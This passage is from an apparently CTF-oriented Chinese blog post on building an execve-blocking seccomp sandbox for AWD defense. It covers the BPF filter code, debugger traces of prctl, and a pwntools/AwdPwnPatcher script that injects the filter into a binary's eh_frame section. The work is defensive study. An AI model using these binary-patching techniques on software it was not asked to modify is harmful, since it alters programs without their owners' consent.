class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_seccomp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">// 读取系统调用号</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否为 execve 系统调用（编号 59）</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果是 execve，则杀死进程</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 允许其他系统调用</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter = filter</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用 seccomp 过滤模式</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    install_seccomp();</span><br><span class="line">    <span class="comment">// 你可以在这里运行原来的程序逻辑</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个 <code>install_seccomp()</code> 函数的作用是通过 <code>seccomp</code>（安全计算模式）设置一个简单的沙箱来限制程序能够调用的系统调用，具体来说，是禁止调用 <code>execve</code> 系统调用。如果程序尝试调用 <code>execve</code>，则会被杀死。其余的系统调用则被允许执行。</p>
<p>以下是其中每个部分的功能和用法的详细解释：</p>
<h4 id="struct-sock-filter-filter"><a href="#struct-sock-filter-filter" class="headerlink" title="struct sock_filter filter[]"></a>struct sock_filter filter[]</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这是一个 BPF（Berkeley Packet Filter）过滤器指令数组，用来定义程序的过滤规则。每一条 <code>sock_filter</code> 定义了一条 BPF 指令，用来判断并处理系统调用。</p>
<p><strong>第一条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr))</span><br></pre></td></tr></table></figure></div>

<ul>
<li>这里使用 <code>BPF_LD</code> 加载 <code>seccomp_data</code> 结构体中的 <code>nr</code> 成员（即系统调用号）。</li>
<li><code>BPF_W</code> 表示加载的是一个 32 位的值。</li>
<li><code>BPF_ABS</code> 表示从固定的偏移量读取数据。</li>
<li><code>offsetof(struct seccomp_data, nr)</code> 是 <code>seccomp_data</code> 结构体中 <code>nr</code> 成员的偏移量，<code>nr</code> 是存储系统调用号的字段。</li>
</ul>
<p>这条指令的作用是读取当前正在执行的系统调用号，以便后续判断是否是 <code>execve</code> 系统调用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nr;        <span class="comment">// 系统调用号</span></span><br><span class="line">    __u32 arch;    <span class="comment">// 架构信息</span></span><br><span class="line">    __u64 instruction_pointer; <span class="comment">// 指令指针</span></span><br><span class="line">    __u64 args[<span class="number">6</span>]; <span class="comment">// 系统调用参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>其中由于linux内核中结构体定义如上，所以实际上offsetof(struct seccomp_data, nr)也可以写为0。</p>
<p><strong>第二条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>BPF_JMP</code> 指令执行跳转。</li>
<li><code>BPF_JEQ</code> 是“跳转如果相等”的操作符，表示如果条件为真则跳转。</li>
<li><code>BPF_K</code> 指定了一个立即数（这里为 59）。</li>
</ul>
<p>这条指令会判断加载的系统调用号是否等于 <code>execve</code> 的系统调用号（59）。如果是，则跳过后面的第一条指令，继续执行杀死进程的语句；否则跳过后面的两条指令，直接允许执行系统调用。</p>
<p><strong>第三条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>BPF_RET</code> 表示返回结果。</li>
<li><code>BPF_K</code> 表示一个立即数操作，这里为 <code>SECCOMP_RET_KILL</code>，这是 seccomp 的一个特定返回值，表示当遇到 <code>execve</code> 系统调用时杀死进程。</li>
</ul>
<p>这条指令表示如果系统调用号是 <code>execve</code>，则终止进程。</p>
<p><strong>第四条指令</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>这条指令会返回 <code>SECCOMP_RET_ALLOW</code>，表示允许其他系统调用正常执行。</li>
</ul>
<h4 id="struct-sock-fprog-prog"><a href="#struct-sock-fprog-prog" class="headerlink" title="struct sock_fprog prog"></a><strong>struct sock_fprog prog</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>struct sock_fprog</code> 是一个包含 seccomp 过滤器程序的结构体：<ul>
<li><code>len</code> 表示 <code>filter</code> 数组的长度（指令数量）。通过 <code>sizeof(filter) / sizeof(filter[0])</code> 来计算过滤器中有多少条指令。</li>
<li><code>filter</code> 是一个指向 <code>sock_filter</code> 数组的指针，用于存储 seccomp 过滤器的指令集。</li>
</ul>
</li>
</ul>
<p>该结构体用于将 BPF 过滤器指令加载到内核中。</p>
<h4 id="prctl-系统调用"><a href="#prctl-系统调用" class="headerlink" title="prctl 系统调用"></a><strong>prctl 系统调用</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>prctl</code> 是用来对进程的某些属性进行设置的系统调用。</li>
<li><code>PR_SET_SECCOMP</code> 是用于启用 seccomp 的选项。</li>
<li><code>SECCOMP_MODE_FILTER</code> 表示以过滤模式运行 seccomp，意味着我们会使用 BPF 过滤器来决定哪些系统调用可以执行，哪些会被拒绝。</li>
<li><code>&amp;prog</code> 是指向我们定义的过滤器程序的指针，它告诉内核使用这个过滤器来限制系统调用。</li>
</ul>
<p>如果 <code>prctl</code> 调用失败，意味着 seccomp 设置失败，会输出错误信息并终止进程。</p>
<p>这里其实也可以把SECCOMP_MODE_FILTER改成 SECCOMP_MODE_STRICT  ，然后就不用构建并传prog了，这样一来会仅仅允许exit，sigreturn，read以及write的系统调用。</p>
<p>其中BPF_STMT与BPF_JUMP实际上是一个宏定义，是条件编译后赋值的sock_filter结构体，这就是为什么<code>struct sock_filter filter[]</code>这个声明是声明结构体数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>而sock_filter的结构体定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span></span><br><span class="line">    __u16   code;   <span class="comment">/* BPF opcode */</span></span><br><span class="line">    __u8    jt;     <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8    jf;     <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32   k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h4 id="其他一些常用的宏定义"><a href="#其他一些常用的宏定义" class="headerlink" title="其他一些常用的宏定义"></a>其他一些常用的宏定义</h4><p>基本都是位掩码，只需要知道其代表的含义即可。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主指令类别（2 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LD          0x00  <span class="comment">// Load</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LDX         0x01  <span class="comment">// Load with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ST          0x02  <span class="comment">// Store</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STX         0x03  <span class="comment">// Store with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU         0x04  <span class="comment">// ALU (arithmetic logic unit) operation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP         0x05  <span class="comment">// Jump</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MISC        0x07  <span class="comment">// Miscellaneous</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作码的大小（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_W           0x00  <span class="comment">// Word (32-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_H           0x08  <span class="comment">// Half-word (16-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_B           0x10  <span class="comment">// Byte (8-bit)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载/存储操作的模式（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IMM         0x00  <span class="comment">// Immediate value</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ABS         0x20  <span class="comment">// Absolute</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IND         0x40  <span class="comment">// Indirect</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MEM         0x60  <span class="comment">// Memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LEN         0x80  <span class="comment">// Packet length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MSH         0xA0  <span class="comment">// Modulo shift</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算和比较操作的源（1 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_K           0x00  <span class="comment">// Constant</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_X           0x08  <span class="comment">// Register</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ALU 运算符（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ADD         0x00  <span class="comment">// Addition</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SUB         0x10  <span class="comment">// Subtraction</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MUL         0x20  <span class="comment">// Multiplication</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_DIV         0x30  <span class="comment">// Division</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OR          0x40  <span class="comment">// Bitwise OR</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_AND         0x50  <span class="comment">// Bitwise AND</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LSH         0x60  <span class="comment">// Left shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RSH         0x70  <span class="comment">// Right shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_NEG         0x80  <span class="comment">// Negation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MOD         0x90  <span class="comment">// Modulo</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_XOR         0xA0  <span class="comment">// Bitwise XOR</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转条件（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JA          0x00  <span class="comment">// Jump unconditionally</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JEQ         0x10  <span class="comment">// Jump if equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGT         0x20  <span class="comment">// Jump if greater than</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGE         0x30  <span class="comment">// Jump if greater or equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JSET        0x40  <span class="comment">// Jump if bits are set</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return 操作码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL 0x00000000  <span class="comment">// Kill process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ALLOW 0x7fff0000 <span class="comment">// Allow syscall</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对seccomp mode 进行操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP     22</span></span><br></pre></td></tr></table></figure></div>



<h3 id="二、调试获取汇编写法"><a href="#二、调试获取汇编写法" class="headerlink" title="二、调试获取汇编写法"></a>二、调试获取汇编写法</h3><p>查看pwndbg，install_seccomp()函数的主逻辑如下，我们可以发现除了prctl系统调用外，前面的一系列结构体的初始化都没有调用函数，而且这一大通操作实际上很多是一个一个字节进行的修改，那么我们在eh_frame空间有限的情况下，实际可以通过8字节直接赋值参数来节省掉许多指令字节。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5555555551e4 &lt;install_seccomp+27&gt;    mov    word ptr [rbp - 0x30], 0x20     [0x7fffffffe450] =&gt; 0x20</span><br><span class="line">0x5555555551ea &lt;install_seccomp+33&gt;    mov    byte ptr [rbp - 0x2e], 0        [0x7fffffffe452] =&gt; 0</span><br><span class="line">0x5555555551ee &lt;install_seccomp+37&gt;    mov    byte ptr [rbp - 0x2d], 0        [0x7fffffffe453] =&gt; 0</span><br><span class="line">0x5555555551f2 &lt;install_seccomp+41&gt;    mov    dword ptr [rbp - 0x2c], 0       [0x7fffffffe454] =&gt; 0</span><br><span class="line">0x5555555551f9 &lt;install_seccomp+48&gt;    mov    word ptr [rbp - 0x28], 0x15     [0x7fffffffe458] =&gt; 0x15</span><br><span class="line">0x5555555551ff &lt;install_seccomp+54&gt;    mov    byte ptr [rbp - 0x26], 0        [0x7fffffffe45a] =&gt; 0</span><br><span class="line">0x555555555203 &lt;install_seccomp+58&gt;     mov    byte ptr [rbp - 0x25], 1               [0x7fffffffe45b] =&gt; 1</span><br><span class="line">0x555555555207 &lt;install_seccomp+62&gt;     mov    dword ptr [rbp - 0x24], 0x3b           [0x7fffffffe45c] =&gt; 0x3b</span><br><span class="line">0x55555555520e &lt;install_seccomp+69&gt;     mov    word ptr [rbp - 0x20], 6               [0x7fffffffe460] =&gt; 6</span><br><span class="line">0x555555555214 &lt;install_seccomp+75&gt;     mov    byte ptr [rbp - 0x1e], 0               [0x7fffffffe462] =&gt; 0</span><br><span class="line">0x555555555218 &lt;install_seccomp+79&gt;     mov    byte ptr [rbp - 0x1d], 0               [0x7fffffffe463] =&gt; 0</span><br><span class="line">0x55555555521c &lt;install_seccomp+83&gt;     mov    dword ptr [rbp - 0x1c], 0              [0x7fffffffe464] =&gt; 0</span><br><span class="line">0x555555555223 &lt;install_seccomp+90&gt;     mov    word ptr [rbp - 0x18], 6               [0x7fffffffe468] =&gt; 6</span><br><span class="line">0x555555555229 &lt;install_seccomp+96&gt;     mov    byte ptr [rbp - 0x16], 0               [0x7fffffffe46a] =&gt; 0</span><br><span class="line">0x55555555522d &lt;install_seccomp+100&gt;    mov    byte ptr [rbp - 0x15], 0               [0x7fffffffe46b] =&gt; 0</span><br><span class="line">0x555555555231 &lt;install_seccomp+104&gt;    mov    dword ptr [rbp - 0x14], 0x7fff0000     [0x7fffffffe46c] =&gt; 0x7fff0000</span><br><span class="line">0x555555555238 &lt;install_seccomp+111&gt;    mov    word ptr [rbp - 0x40], 4               [0x7fffffffe440] =&gt; 4</span><br><span class="line">0x55555555523e &lt;install_seccomp+117&gt;    lea    rax, [rbp - 0x30]                      RAX =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555242 &lt;install_seccomp+121&gt;    mov    qword ptr [rbp - 0x38], rax            [0x7fffffffe448] =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555246 &lt;install_seccomp+125&gt;    lea    rax, [rbp - 0x40]                      RAX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524a &lt;install_seccomp+129&gt;    mov    rdx, rax                               RDX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524d &lt;install_seccomp+132&gt;    mov    esi, 2                                 ESI =&gt; 2</span><br><span class="line">0x555555555252 &lt;install_seccomp+137&gt;    mov    edi, 0x16                              EDI =&gt; 0x16</span><br><span class="line">0x555555555257 &lt;install_seccomp+142&gt;    mov    eax, 0                                 EAX =&gt; 0</span><br><span class="line">0x55555555525c &lt;install_seccomp+147&gt;    call   prctl@plt                   			  &lt;prctl@plt&gt;</span><br></pre></td></tr></table></figure></div>


<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151136186.png"
                      class=""
                >

<p>最后整个prog结构体的地址是存在rdx中，也就是rbp - 0x40这个地址处。但之后遇到了问题，在prctl函数的实现中，在prctl的系统调用时始终不成功，返回的rax代表的错误码。之后尝试直接执行test，发现是权限问题。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151151584.png"
                      class=""
                >

<p>这下尴尬了，本来想上沙箱是为了方便防御，这么一来二去搞awd前还得提权，更加麻烦了，这下就只能算是学习沙箱实现的机制了。那么我们得切到root用户进行调试（本来想setuid改文件，但好像wsl不支持），进到prctl具体实现里看看。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7eae338</span> &lt;prctl+<span class="number">8</span>&gt;        mov    r10, rcx                        R10 =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae33b</span> &lt;prctl+<span class="number">11</span>&gt;       mov    qword ptr [rsp + <span class="number">0x28</span>], rsi     [<span class="number">0x7fffffffe408</span>] =&gt; <span class="number">2</span></span><br><span class="line"><span class="number">0x7ffff7eae340</span> &lt;prctl+<span class="number">16</span>&gt;       mov    qword ptr [rsp + <span class="number">0x30</span>], rdx     [<span class="number">0x7fffffffe410</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae345</span> &lt;prctl+<span class="number">21</span>&gt;       mov    qword ptr [rsp + <span class="number">0x38</span>], rcx     [<span class="number">0x7fffffffe418</span>] =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae34a</span> &lt;prctl+<span class="number">26</span>&gt;       mov    qword ptr [rsp + <span class="number">0x40</span>], r8      [<span class="number">0x7fffffffe420</span>] =&gt; <span class="number">0x7ffff7fa3f10</span> (initial+<span class="number">16</span>) ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae34f</span> &lt;prctl+<span class="number">31</span>&gt;       mov    rax, qword ptr fs:[<span class="number">0x28</span>]        RAX, [<span class="number">0x7ffff7d85768</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae358</span> &lt;prctl+<span class="number">40</span>&gt;       mov    qword ptr [rsp + <span class="number">0x18</span>], rax     [<span class="number">0x7fffffffe3f8</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae35d</span> &lt;prctl+<span class="number">45</span>&gt;    xor    eax, eax                        EAX =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae35f</span> &lt;prctl+<span class="number">47</span>&gt;    lea    rax, [rsp + <span class="number">0x60</span>]               RAX =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae364</span> &lt;prctl+<span class="number">52</span>&gt;    mov    dword ptr [rsp], <span class="number">8</span>              [<span class="number">0x7fffffffe3e0</span>] =&gt; <span class="number">8</span></span><br><span class="line"><span class="number">0x7ffff7eae36b</span> &lt;prctl+<span class="number">59</span>&gt;    mov    qword ptr [rsp + <span class="number">8</span>], rax        [<span class="number">0x7fffffffe3e8</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae370</span> &lt;prctl+<span class="number">64</span>&gt;    lea    rax, [rsp + <span class="number">0x20</span>]               RAX =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae375</span> &lt;prctl+<span class="number">69</span>&gt;    mov    qword ptr [rsp + <span class="number">0x10</span>], rax     [<span class="number">0x7fffffffe3f0</span>] =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae37a</span> &lt;prctl+<span class="number">74</span>&gt;    mov    eax, <span class="number">0x9d</span>                       EAX =&gt; <span class="number">0x9d</span></span><br><span class="line"><span class="number">0x7ffff7eae37f</span> &lt;prctl+<span class="number">79</span>&gt;    syscall  &lt;SYS_prctl&gt;</span><br></pre></td></tr></table></figure></div>

<p>最后syscall时rdi为0x16，rsi为2，rdx为0x7fffffffe440（prog结构体地址），前面的操作用处不大，就是把寄存器参数加载到了栈上以及存了下canary。r10用rcx赋值，r8不变。那么我们只要把那个结构体伪造出来，就可以直接syscall来禁用一些系统调用。理论可行，开始手搓。</p>
<p>我们可以拿一道简单的栈溢出来试一下，更改程序我用的是 <a class="link"   href="https://github.com/aftern00n/AwdPwnPatcher" >https://github.com/aftern00n/AwdPwnPatcher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这个库，我们可以把call init patch成一个跳转到ehframe段执行，再在ehframe段最后手动加上call init。AwdPwnPatcher中有个add_constant_in_ehframe方法，其中会将传入的字符串转换为字节字符串。我感觉还是直接在传参前用p64伪造好结构体的各字段比较方便，所以就把库里面字符串的encode逻辑给注释掉了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151211381.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151222496.png"
                      class=""
                >

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line">sock_filter = p64(<span class="number">0x20</span>) + p64(<span class="number">0x3b01000015</span>) + p64(<span class="number">6</span>) + p64(<span class="number">0x7fff000000000006</span>)</span><br><span class="line">sock_filter_addr = awd_pwn_patcher.add_constant_in_ehframe(sock_filter)</span><br><span class="line"></span><br><span class="line">prog = p64(<span class="number">4</span>) + p64(sock_filter_addr)</span><br><span class="line">prog_addr = awd_pwn_patcher.add_constant_in_ehframe(prog)</span><br><span class="line"></span><br><span class="line">assembly = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,157</span></span><br><span class="line"><span class="string">    mov rdi,22</span></span><br><span class="line"><span class="string">    mov rsi,2</span></span><br><span class="line"><span class="string">    lea rdx,[<span class="subst">&#123;prog_addr&#125;</span>]</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call 0x40117A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.patch_by_jmp(jmp_from=<span class="number">0x4011F0</span>,jmp_to=<span class="number">0x4011F5</span>,assembly=assembly)</span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure></div>

<p>这时候本来充满期待开始调试二进制程序，但是首先遇到的问题是ehframe段不可执行，一般来说awd_pwn_patcher.save()时会自动把这个段设为可执行，但这里不知道出了什么问题，得自己手动来。根据<a class="link"   href="https://blog.csdn.net/qq_46106285/article/details/124972056" >https://blog.csdn.net/qq_46106285/article/details/124972056<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这篇博客能够成功地设置段权限。第二个问题是我在root用户下安装pwntools后，发现会让正常用户gdb调试时出现问题，这个问题的解决方案是起一个python的虚拟环境给root用，或者是<code>sudo pip install --user pwntools</code>来指定只给root用户安装python库。之后运行就不会出现问题了。</p>
<p>运行没有patch过的程序：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151236768.png"
                      class=""
                >

<p>经过patch之后：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151247626.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151256919.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151305738.png"
                      class=""
                >

<p>经过计算，构造禁用execve沙箱所用的仅有0x53字节，一般而言ehframe段还是够用的，每个多加的规则也只会多出8字节的开销，改一下结构体的参数就行。但由于前提是要有root权限执行程序，也是挺鸡肋的。</p>
